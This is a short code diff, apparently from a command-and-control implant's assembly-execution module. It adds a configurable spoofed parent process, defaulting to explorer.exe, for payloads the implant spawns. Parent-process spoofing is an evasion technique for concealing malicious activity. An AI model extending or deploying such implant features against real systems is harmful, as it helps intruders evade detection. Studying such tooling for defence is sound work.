@@ -59,6 +59,7 @@ AssemblyExec::AssemblyExec()
 #endif
 {
 	m_processToSpawn="";
+	m_spoofedParent="";
 	m_useSyscall=false;
 	m_isModeProcess = true;
 	m_isSpoofParent = true;
@@ -243,8 +244,13 @@ int AssemblyExec::initConfig(const nlohmann::json &config)
 			m_processToSpawn = it.value();
 		else if(it.key()=="syscall")
 			m_useSyscall = true;
-		// put the parent spoof ??
-			
+		else if(it.key()=="isModeProcess")
+			m_isModeProcess = (bool)it.value();
+		else if(it.key()=="spoofedParent")
+		{
+			m_isSpoofParent = true;
+			m_spoofedParent = it.value();
+		}			
 	}
 
 	return 0;
@@ -276,6 +282,8 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 	std::string spoofedParent="explorer.exe";
 	if(!m_processToSpawn.empty())
 		processToSpawn=m_processToSpawn;
+	if(!m_spoofedParent.empty())
+		spoofedParent=m_spoofedParent;
 
 	if(m_isModeProcess && !m_isSpoofParent)
 		createNewProcess(payload, processToSpawn, result);
